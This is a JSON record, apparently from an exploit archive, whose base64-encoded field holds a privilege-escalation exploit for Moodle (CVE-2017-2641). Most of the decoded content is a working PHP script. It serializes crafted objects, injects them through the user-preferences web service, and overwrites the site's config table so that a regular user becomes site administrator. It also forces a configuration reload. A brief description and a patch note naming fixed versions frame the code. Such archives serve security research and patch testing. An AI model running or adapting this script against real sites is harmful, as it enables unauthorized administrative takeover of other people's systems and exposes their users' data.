{
    "source": "exploit-database", 
    "exploit": "IyBFeHBsb2l0OiBNb29kbGUgU1FMIEluamVjdGlvbiB2aWEgT2JqZWN0IEluamVjdGlvbiBUaHJvdWdoIFVzZXIgUHJlZmVyZW5jZXMNCiMgRGF0ZTogQXByaWwgNnRoLCAyMDE3DQojIEV4cGxvaXQgQXV0aG9yOiBNYXJrbyBCZWx6ZXRza2kNCiMgQ29udGFjdDogbWJlbHpldHNraUBwcm90b25tYWlsLmNvbQ0KIyBWZW5kb3IgSG9tZXBhZ2U6IGh0dHBzOi8vbW9vZGxlLm9yZy8NCiMgVmVyc2lvbjogMy4yIHRvIDMuMi4xLCAzLjEgdG8gMy4xLjQsIDMuMCB0byAzLjAuOCwgMi43LjAgdG8gMi43LjE4IGFuZCBvdGhlciB1bnN1cHBvcnRlZCB2ZXJzaW9ucw0KIyBUZXN0ZWQgb246IE1vb2RsZSAzLjIgcnVubmluZyBvbiBwaHA3LjAgb24gVWJ1bnR1IDE2LjA0DQojIENWRSA6IENWRS0yMDE3LTI2NDENCg0KMS4gRGVzY3JpcHRpb24NCkluIE1vb2RsZSAzLjIgdG8gMy4yLjEsIDMuMSB0byAzLjEuNCwgMy4wIHRvIDMuMC44LCAyLjcuMCB0byAyLjcuMTggYW5kIG90aGVyIHVuc3VwcG9ydGVkIHZlcnNpb25zLCBhbnkgcmVnaXN0ZXJlZCB1c2VyIGNhbiB1cGRhdGUgYW55IHRhYmxlIG9mIHRoZSBNb29kbGUgZGF0YWJhc2UgdmlhIGFuIG9iamVjdGlvbiBpbmplY3Rpb24gdGhyb3VnaCBhIGxlZ2FjeSB1c2VyIHByZWZlcmVuY2VzIHNldHRpbmcgKERlc2NyaWJlZCBieSBOZXRhbmVsIFJ1YmluIGF0IGh0dHA6Ly9uZXRhbmVscnViLmluLzIwMTcvMDMvMjAvbW9vZGxlLXJlbW90ZS1jb2RlLWV4ZWN1dGlvbi8pDQoNCjIuIFBvQw0KTG9nIGluIGFzIGEgcmVndWxhciB1c2VyIGFuZCBub3RlIHRoZSBVUkwgb2YgdGhlIE1vb2RsZSBzaXRlLCB0aGUgJ01vb2RsZVNlc3Npb24nIGNvb2tpZSB2YWx1ZSBhbmQgdGhlICdzZXNza2V5JyBwYXJhbWV0ZXIgYWxvbmcgd2l0aCB5b3VyICd1c2VyaWQnIGZyb20gdGhlIHBhZ2Ugc291cmNlLiBQYXN0ZSB0aGVzZSB2YWx1ZXMgaW50byB0aGUgZXhwbG9pdCBzY3JpcHQsIGZpcmUgdGhlIHNjcmlwdCwgcmUtYXV0aGVudGljYXRlIGFuZCB5b3Ugd2lsbCBiZSB0aGUgc2l0ZSBhZG1pbmlzdHJhdG9yLg0KDQo8P3BocA0KDQovL2RlZmluaW5nIHRoZSByZXF1aXJlZCBjbGFzc2VzIGZvciBvdXIgZXhwbG9pdA0KbmFtZXNwYWNlIGdyYWRlcmVwb3J0X3NpbmdsZXZpZXdcbG9jYWxcdWkgew0KICAgIGNsYXNzIGZlZWRiYWNreyAgIA0KICAgIH0NCn0NCg0KbmFtZXNwYWNlIHsNCiAgICBjbGFzcyBncmFkZXJlcG9ydF9vdmVydmlld19leHRlcm5hbHsNCn0NCg0KY2xhc3MgZ3JhZGVfaXRlbXsNCn0NCg0KY2xhc3MgZ3JhZGVfZ3JhZGV7DQp9DQoNCg0KLy8gY3JlYXRpbmcgYSBzaW1wbGUgaHR0cFBvc3QgbWV0aG9kIHdoaWNoIHJlcXVpcmVzIHBocC1jdXJsDQpmdW5jdGlvbiBodHRwUG9zdCgkdXJsLCAkZGF0YSwgJE1vb2RsZVNlc3Npb24sICRqc29uKQ0Kew0KICAgICRjdXJsID0gY3VybF9pbml0KCR1cmwpOw0KICAgICRoZWFkZXJzID0gYXJyYXkoJ0Nvb2tpZTogTW9vZGxlU2Vzc2lvbj0nLiRNb29kbGVTZXNzaW9uKTsNCiAgICBpZigkanNvbil7DQogICAgICAgIGFycmF5X3B1c2goJGhlYWRlcnMsICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nKTsNCiAgICB9ZWxzZXsNCiAgICAgICAgJGRhdGEgPSAgdXJsZGVjb2RlKGh0dHBfYnVpbGRfcXVlcnkoJGRhdGEpKTsNCiAgICB9DQogICAgY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfUE9TVCwgdHJ1ZSk7DQogICAgY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfSFRUUEhFQURFUiwgJGhlYWRlcnMpOw0KICAgIGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1BPU1RGSUVMRFMsICRkYXRhKTsNCiAgICBjdXJsX3NldG9wdCgkY3VybCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgdHJ1ZSk7DQogICAgLy8gY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfUFJPWFksICcxMjcuMC4wLjE6ODA4MCcpOyAvL3VuLWNvbW1lbnQgaWYgeW91IHdpc2ggdG8gdXNlIGEgcHJveHkNCiAgICAkcmVzcG9uc2UgPSBjdXJsX2V4ZWMoJGN1cmwpOw0KICAgIGN1cmxfY2xvc2UoJGN1cmwpOw0KICAgIHJldHVybiAkcmVzcG9uc2U7DQp9DQoNCi8vIGNyZWF0aW5nIGEgc2ltcGxlIGh0dHBHZXQgbWV0aG9kIHdoaWNoIHJlcXVpcmVzIHBocC1jdXJsDQpmdW5jdGlvbiBodHRwR2V0KCR1cmwsICRNb29kbGVTZXNzaW9uKQ0Kew0KICAgICRjdXJsID0gY3VybF9pbml0KCR1cmwpOw0KICAgICRoZWFkZXJzID0gYXJyYXkoJ0Nvb2tpZTogTW9vZGxlU2Vzc2lvbj0nLiRNb29kbGVTZXNzaW9uKTsNCiAgICBjdXJsX3NldG9wdCgkY3VybCwgQ1VSTE9QVF9IVFRQSEVBREVSLCAkaGVhZGVycyk7DQogICAgY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOw0KICAgIC8vIGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1BST1hZLCAnMTI3LjAuMC4xOjgwODAnKTsgLy91bi1jb21tZW50IGlmIHlvdSB3aXNoIHRvIHVzZSBhIHByb3h5DQogICAgJHJlc3BvbnNlID0gY3VybF9leGVjKCRjdXJsKTsNCiAgICBjdXJsX2Nsb3NlKCRjdXJsKTsNCiAgICByZXR1cm4gJHJlc3BvbnNlOw0KfQ0KDQpmdW5jdGlvbiB1cGRhdGVfdGFibGUoJHVybCwgJE1vb2RsZVNlc3Npb24sICRzZXNza2V5LCAkdGFibGUsICRyb3dJZCwgJGNvbHVtbiwgJHZhbHVlKXsNCiAgICAvL2ZpcnN0IHdlIGNyZWF0ZSBhIGdyYWRlcmVwb3J0X292ZXJ2aWV3X2V4dGVybmFsIG9iamVjdCBiZWNhdXNlIGl0IGlzIHN1cHBvcnRlZCBieSB0aGUgTW9vZGxlIGF1dG9sb2FkZXIgYW5kIGl0IGluY2x1ZGVzIHRoZSBncmFkZV9ncmFkZSBhbmQgZ3JhZGVfaXRlbSBjbGFzc2VzIHRoYXQgd2UgYXJlIGdvaW5nIHRvIG5lZWQNCiAgICAkYmFzZSA9IG5ldyBncmFkZXJlcG9ydF9vdmVydmlld19leHRlcm5hbCgpOw0KDQogICAgLy8gbm93IHdlIGNyZWF0ZSB0aGUgZmVlZGJhY2sgb2JqZWN0IHdoaWNoIGluaGVyaXRzIHRoZSB2dWxuZXJhYmxlIF9fdG9zdHJpbmcoKSBtZXRob2QgZnJvbSBpdHMgcGFyZW50DQogICAgJGZiID0gbmV3IGdyYWRlcmVwb3J0X3NpbmdsZXZpZXdcbG9jYWxcdWlcZmVlZGJhY2soKTsNCg0KICAgIC8vZmlsbGluZyB0aGUgZmVlZGJhY2sgb2JqZWN0IHdpdGggdGhlIHJlcXVpcmVkIHByb3BlcnRpZXMgZm9yIHRoZSBleHBsb2l0IHRvIHdvcmsNCiAgICAkZmIgLT4gZ3JhZGUgPSBuZXcgZ3JhZGVfZ3JhZGUoKTsNCiAgICAkZmIgLT4gZ3JhZGUgLT4gZ3JhZGVfaXRlbSA9IG5ldyBncmFkZV9pdGVtKCk7DQogICAgJGZiIC0+IGdyYWRlIC0+IGdyYWRlX2l0ZW0gLT4gY2FsY3VsYXRpb24gPSAiW1tzb21lc3RyaW5nIjsNCiAgICAkZmIgLT4gZ3JhZGUgLT4gZ3JhZGVfaXRlbSAtPiBjYWxjdWxhdGlvbl9ub3JtYWxpemVkID0gZmFsc2U7DQoNCiAgICAvL3NldHRpbmcgdGhlIHRhYmxlIHdoaWNoIHdlIHdhbnQgdG8gYWx0ZXINCiAgICAkZmIgLT4gZ3JhZGUgLT4gZ3JhZGVfaXRlbSAtPiB0YWJsZSA9ICR0YWJsZTsNCiAgICAvL3NldHRpbmcgdGhlIHJvdyBpZCBvZiB0aGUgcm93IHRoYXQgd2Ugd2FudCB0byBhbHRlcg0KICAgICRmYiAtPiBncmFkZSAtPiBncmFkZV9pdGVtIC0+IGlkID0gJHJvd0lkOw0KICAgIC8vc2V0dGluZyB0aGUgY29sdW1uIHdpdGggdGhlIHZhbHVlIHRoYXQgd2Ugd2FudCB0byBpbnNlcnQNCiAgICAkZmIgLT4gZ3JhZGUgLT4gZ3JhZGVfaXRlbSAtPiAkY29sdW1uID0gJHZhbHVlOw0KICAgICRmYiAtPiBncmFkZSAtPiBncmFkZV9pdGVtIC0+IHJlcXVpcmVkX2ZpZWxkcyA9IGFycmF5KCRjb2x1bW4sJ2lkJyk7DQogICAgDQogICAgLy9jcmVhdGluZyB0aGUgYXJyYXkgd2l0aCBvdXIgYmFzZSBvYmplY3QgKHdoaWNoIGl0c2VsZiBpcyBpbmNsdWRlZCBpbiBhbiBhcnJheSBiZWNhdXNlIHRoZSBiYXNlIG9iamVjdCBoYXMgbm8gX190b3N0cmluZygpIG1ldGhvZCkgYW5kIG91ciBwYXlsb2FkIG9iamVjdA0KICAgICRhcnIgPSBhcnJheShhcnJheSgkYmFzZSksJGZiKTsNCiAgICANCiAgICAvL3NlcmlhbGl6aW5nIHRoZSBhcnJheQ0KICAgICR2YWx1ZSA9IHNlcmlhbGl6ZSgkYXJyKTsNCg0KICAgIC8vd2UnbGwgc2V0IHRoZSBjb3Vyc2VfYmxvY2tzIHNvcnRvcmRlciB0byAwIHNvIHdlIGRlZmF1bHQgdG8gbGVnYWN5IHVzZXIgcHJlZmVyZW5jZQ0KICAgICRkYXRhID0gYXJyYXkoJ3Nlc3NrZXknID0+ICRzZXNza2V5LCAnc29ydG9yZGVyW10nID0+IDApOw0KICAgIGh0dHBQb3N0KCR1cmwuICcvYmxvY2tzL2NvdXJzZV9vdmVydmlldy9zYXZlLnBocCcsJGRhdGEsICRNb29kbGVTZXNzaW9uLDApOw0KDQogICAgLy9pbmplY3RpbmcgdGhlIHBheWxvYWQNCiAgICAkZGF0YSA9IGpzb25fZW5jb2RlKGFycmF5KGFycmF5KCdpbmRleCc9PiAwLCAnbWV0aG9kbmFtZSc9Pidjb3JlX3VzZXJfdXBkYXRlX3VzZXJfcHJlZmVyZW5jZXMnLCdhcmdzJz0+YXJyYXkoJ3ByZWZlcmVuY2VzJz0+YXJyYXkoYXJyYXkoJ3R5cGUnPT4gJ2NvdXJzZV9vdmVydmlld19jb3Vyc2Vfb3JkZXInLCAndmFsdWUnID0+ICR2YWx1ZSkpKSkpKTsNCiAgICBodHRwUG9zdCgkdXJsLicvbGliL2FqYXgvc2VydmljZS5waHA/c2Vzc2tleT0nLiRzZXNza2V5LCAkZGF0YSwgJE1vb2RsZVNlc3Npb24sMSk7DQoNCiAgICAvL2dldHRpbmcgdGhlIGZyb250cGFnZSBzbyB0aGUgcGF5bG9hZCB3aWxsIGFjdGl2YXRlDQogICAgaHR0cEdldCgkdXJsLicvbXkvJywgJE1vb2RsZVNlc3Npb24pOw0KICAgIH0NCg0KJHVybCA9ICcnOyAvL3VybCBvZiB0aGUgTW9vZGxlIHNpdGUNCiRNb29kbGVTZXNzaW9uID0gJycgLy95b3VyIE1vb2RsZVNlc3Npb24gY29va2llIHZhbHVlDQokc2Vzc2tleSA9ICcnOyAvL3lvdXIgc2Vzc2tleQ0KDQokdGFibGUgPSAiY29uZmlnIjsgLy90YWJsZSB0byB1cGRhdGUgDQokcm93SWQgPSAyNTsgLy8gcm93IGlkIHRvIGluc2VydCBpbnRvLiAyNSBpcyB0aGUgcm93IHRoYXQgc2V0cyB0aGUgJ3NpdGVhZG1pbnMnIHBhcmFtZXRlci4gY291bGQgdmFyeSBmcm9tIGluc3RhbGxhdGlvbiB0byBpbnN0YWxsYXRpb24NCiRjb2x1bW4gPSAndmFsdWUnOyAvL2NvbHVtbiBuYW1lIHRvIHVwZGF0ZSwgd2hpY2ggaG9sZHMgdGhlIHVzZXJpZA0KJHZhbHVlID0gMzsgLy8gdXNlcmlkIHRvIHNldCBhcyAnc2l0ZWFkbWlucycgUHJvYmFibHkgd2FudCB0byBtYWtlIGl0IHlvdXIgb3duDQoNCnVwZGF0ZV90YWJsZSgkdXJsLCAkTW9vZGxlU2Vzc2lvbiwkc2Vzc2tleSwkdGFibGUsJHJvd0lkLCRjb2x1bW4sICR2YWx1ZSk7DQoNCi8vcmVzZXQgdGhlIGFsbHZlcnNpb25zaGFzaCBjb25maWcgZW50cnkgd2l0aCBhIHNoYTEgaGFzaCBzbyB0aGUgc2l0ZSByZWxvYWRzIGl0cyBjb25maWd1cmF0aW9uDQokcm93SWQgPSAzNzUgLy8gcm93IGlkIG9mICdhbGx2ZXJzaW9uc2hhc2gnIHBhcmFtZXRlcg0KdXBkYXRlX3RhYmxlKCR1cmwsICRNb29kbGVTZXNzaW9uLCRzZXNza2V5LCR0YWJsZSwkcm93SWQsICRjb2x1bW4sIHNoYTEodGltZSgpKSk7DQoNCi8vcmVzZXQgdGhlIHNvcnRvcmRlciBzbyB3ZSBjYW4gc2VlIHRoZSBmcm9udCBwYWdlIGFnYWluIHdpdGhvdXQgdGhlIHBheWxvYWQgdHJpZ2dlcmluZw0KJGRhdGEgPSBhcnJheSgnc2Vzc2tleScgPT4gJHNlc3NrZXksICdzb3J0b3JkZXJbXScgPT4gMSk7DQpodHRwUG9zdCgkdXJsLiAnL2Jsb2Nrcy9jb3Vyc2Vfb3ZlcnZpZXcvc2F2ZS5waHAnLCRkYXRhLCAkTW9vZGxlU2Vzc2lvbiwwKTsNCg0KLy9mb3JjZSBwbHVnaW5jaGVjayBzbyB3ZSBjYW4gYWNjZXNzIGFkbWluIHBhbmVsDQpodHRwR2V0KCR1cmwuJy9hZG1pbi9pbmRleC5waHA/Y2FjaGU9MCZjb25maXJtcGx1Z2luY2hlY2s9MScsJE1vb2RsZVNlc3Npb24pOw0KDQp9DQo/Pg0KDQoNCjMuIFNvbHV0aW9uOg0KVXBncmFkZSB0byBmaXhlZCBNb29kbGUgdmVyc2lvbnM6IDMuMi4yLCAzLjEuNSwgMy4wLjkgb3IgMi43LjE5", 
    "filename": "platforms/php/webapps/41828.php", 
    "id": "41828", 
    "cves": [
        "CVE-2017-2641"
    ]
}